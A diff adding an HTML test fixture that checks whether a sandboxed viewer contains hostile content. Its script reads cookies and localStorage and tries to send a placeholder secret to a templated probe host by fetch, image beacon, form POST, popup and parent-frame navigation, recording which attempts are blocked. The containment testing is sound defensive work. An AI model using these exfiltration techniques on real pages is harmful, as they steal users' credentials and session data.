@@ -1,0 +1,138 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>Hostile viewer containment fixture</title>
+  <style>
+    body { font-family: monospace; white-space: pre-wrap; }
+  </style>
+</head>
+<body>
+  <pre id="hostile-results" data-complete="false">starting</pre>
+  <script>
+    (() => {
+      const probeBaseUrl = "{{PROBE_BASE_URL}}";
+      const viewerSecret = "viewer-cookie-secret";
+      const output = document.getElementById("hostile-results");
+      const results = {
+        completed: false,
+        cookie: "not-attempted",
+        localStorage: "not-attempted",
+        viewerFetch: "not-attempted",
+        externalFetch: "not-attempted",
+        image: "not-attempted",
+        form: "not-attempted",
+        popup: "not-attempted",
+        parentNavigation: "not-attempted"
+      };
+
+      const render = () => {
+        output.textContent = JSON.stringify(results);
+        output.dataset.complete = String(results.completed);
+      };
+
+      const describeError = error =>
+        `${error && error.name ? error.name : "Error"}`;
+
+      try {
+        results.cookie = `value:${document.cookie}`;
+      } catch (error) {
+        results.cookie = `blocked:${describeError(error)}`;
+      }
+
+      try {
+        results.localStorage =
+          `value:${window.localStorage.getItem("viewer-auth")}`;
+      } catch (error) {
+        results.localStorage = `blocked:${describeError(error)}`;
+      }
+
+      const viewerFetch = fetch(
+        `/__viewer_escape__/fetch?leak=${encodeURIComponent(viewerSecret)}`
+      )
+        .then(async response => {
+          results.viewerFetch =
+            `response:${response.status}:${await response.text()}`;
+        })
+        .catch(error => {
+          results.viewerFetch = `blocked:${describeError(error)}`;
+        });
+
+      const externalFetch = fetch(
+        `${probeBaseUrl}/external-fetch?leak=${encodeURIComponent(viewerSecret)}`
+      )
+        .then(async response => {
+          results.externalFetch =
+            `response:${response.status}:${await response.text()}`;
+        })
+        .catch(error => {
+          results.externalFetch = `blocked:${describeError(error)}`;
+        });
+
+      const imageAttempt = new Promise(resolve => {
+        const image = new Image();
+        const finish = value => {
+          results.image = value;
+          resolve();
+        };
+
+        image.onload = () => finish("loaded");
+        image.onerror = () => finish("blocked");
+        image.src =
+          `${probeBaseUrl}/image.gif?leak=${encodeURIComponent(viewerSecret)}`;
+
+        setTimeout(() => {
+          if (results.image === "not-attempted") {
+            finish("blocked-timeout");
+          }
+        }, 500);
+      });
+
+      try {
+        const form = document.createElement("form");
+        form.method = "post";
+        form.action = `${probeBaseUrl}/form`;
+        const secret = document.createElement("input");
+        secret.name = "leak";
+        secret.value = viewerSecret;
+        form.appendChild(secret);
+        document.body.appendChild(form);
+        results.form = "attempted";
+        form.submit();
+      } catch (error) {
+        results.form = `attempted-blocked:${describeError(error)}`;
+      }
+
+      try {
+        const popup = window.open(
+          `${probeBaseUrl}/popup?leak=${encodeURIComponent(viewerSecret)}`,
+          "_blank"
+        );
+        results.popup = popup === null ? "blocked" : "opened";
+      } catch (error) {
+        results.popup = `blocked:${describeError(error)}`;
+      }
+
+      render();
+
+      Promise.all([viewerFetch, externalFetch, imageAttempt])
+        .then(() => {
+          results.parentNavigation = "attempted";
+          results.completed = true;
+          render();
+
+          setTimeout(() => {
+            try {
+              window.parent.location.href =
+                `${probeBaseUrl}/parent-navigation?leak=${encodeURIComponent(viewerSecret)}`;
+            } catch (error) {
+              results.parentNavigation =
+                `blocked:${describeError(error)}`;
+              render();
+            }
+          }, 250);
+        });
+    })();
+  </script>
+</body>
+</html>
